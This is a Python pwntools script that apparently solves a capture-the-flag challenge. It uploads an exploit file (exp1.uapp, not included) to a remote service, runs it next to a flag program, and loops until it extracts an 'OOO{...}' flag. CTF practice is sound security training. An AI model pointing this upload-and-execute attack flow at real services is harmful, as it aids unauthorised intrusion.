#!/usr/local/bin/python
from pwn import *
import hashlib, sys
context.log_level = 'ERROR'

def exploit():
    r = remote(sys.argv[1], int(sys.argv[2]))
    exp1 = open('exp1.uapp').read()
    r.sendline('download exp1.uapp %d' % len(exp1))
    r.send(exp1)
    r.sendline('run flag1.papp')
    r.sendline('run exp1.uapp')
    d = r.recvuntil('BEGIN\n', timeout=0.5)
    print d
    if not d.endswith('BEGIN\n'):
        return None
    d = r.recvuntil('END\n', drop=True)
    r.sendline('exit')
    flags = re.findall(r'OOO{.*}', d) # it appears multiple times
    print flags
    r.close()
    if len(flags) > 0:
        return flags[0]
    else:
        return None

if __name__ == '__main__':
    while True:
        try:
            flag = exploit()
            if flag:
                break
        except Exception:
            continue
    print 'FLAG:', flag
    sys.exit(0)
